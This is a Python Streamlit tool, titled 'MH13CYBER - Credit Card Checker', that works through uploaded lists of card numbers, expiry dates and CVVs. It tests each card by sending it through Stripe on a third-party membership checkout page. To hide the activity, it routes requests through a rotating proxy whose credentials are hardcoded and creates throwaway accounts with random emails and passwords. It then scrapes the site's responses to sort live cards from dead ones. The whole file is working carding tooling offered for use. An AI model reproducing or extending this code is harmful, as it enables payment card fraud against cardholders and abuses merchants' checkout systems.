import requests
from requests import Session
import random
import string
import time
import streamlit as st

# Streamlit UI
st.title("MH13CYBER - Credit Card Checker")

# Upload card list file
cardlist = st.file_uploader("Upload Card List File", type="txt")
savelist = st.text_input("Enter path to save live cards", value=r"D:\kALI\python\project\telegram bots\cc bot\checker\livecc.txt")

# Function to generate email and password
def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))

    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    domain = random.choice(domains)
    email = f"{username}@{domain}"

    return email, password, username

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return

proxy_info = "http://povmvtrs-rotate:suljy7ayq24u@p.webshare.io:80"

def main(cc, mes, ano, cvv):
    response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
    brand_mapping = {
        "VISA": "visa",
        "MASTERCARD": "mc",
        "AMERICAN EXPRESS": "amex",
        "DINERS CLUB": "diners",
        "DISCOVER": "discover"
    }
    
    response_data = response.json()
    brand = brand_mapping.get(response_data.get("brand", ""))
    r = requests.Session()
    r.proxies = {"http": proxy_info, "https": proxy_info}
    r.cookies.clear()
    url = "https://m.stripe.com/6"
    response = r.post(url)
    resultado13 = response.text
    muid = resultado13.split('"muid":"')[1].split('"')[0].strip()
    sid = resultado13.split('"sid":"')[1].split('"')[0].strip()
    guid = resultado13.split('"guid":"')[1].split('"')[0].strip()
    password = generate_password()[1] 
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }

    params = {
        'level': '7',
    }

    response = r.get('https://ecstest.net/membership-checkout/', params=params, headers=headers)
    key = find_between(response.text, 'var pmproStripe = {"publishableKey":"', '","')
     
    headers.update({
        'Accept': 'application/json',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
    })

    data = {
        'stripe_js_id': '1b4e0fae-ac3e-499f-a312-b37970de73ba',
        'referrer_host': 'ecstest.net',
        'key': key,
        'request_surface': 'web_elements_controller',
    }

    response = r.post('https://merchant-ui-api.stripe.com/elements/wallet-config', headers=headers, data=data)

    arb_id = find_between(response.text, '"arb_id":"', '","')
    
    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fc973c0a0ca%3B+stripe-js-v3%2Fc973c0a0ca%3B+split-card-element&referrer=https%3A%2F%2Fecstest.net&time_on_page=1321660&key={key}'

    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    id = response.json()['id']
    
    headers.update({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://ecstest.net',
        'Referer': 'https://ecstest.net/membership-checkout/?level=7',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    })

    account_number = "X" * 12 + cc[-4:]
    email = generate_password()[0]
    data = [
        ('level', '7'),
        ('checkjavascript', '1'),
        ('username', generate_password()[2]),
        ('password', password),
        ('password2', password),
        ('bemail', email),
        ('bconfirmemail', email),
        ('fullname', ''),
        ('gateway', 'stripe'),
        ('CardType', brand),
        ('submit-checkout', '1'),
        ('javascriptok', '1'),
        ('submit-checkout', '1'),
        ('javascriptok', '1'),
        ('payment_method_id', id),
        ('AccountNumber', account_number),
        ('ExpirationMonth', mes),
        ('ExpirationYear', ano),
    ]

    response = r.post('https://ecstest.net/membership-checkout/', params=params, headers=headers, data=data)
    result = find_between(response.text, ' id="pmpro_message" class="pmpro_message pmpro_error">', '</div>')

    st.write(f'{result} : {cc}|{mes}|{ano}|{cvv}')
    output_string = f"{cc}|{mes}|{ano}|{cvv} --->> {result}\n"
#    with open(savelist, "a") as file:  # add live save path
 #       file.write(output_string)

if cardlist is not None:
    content = cardlist.read().decode('utf-8')
    lines = content.splitlines()
    for line in lines:
        cc, mes, ano, cvv = line.strip().split("|")
        main(cc, mes, ano, cvv)
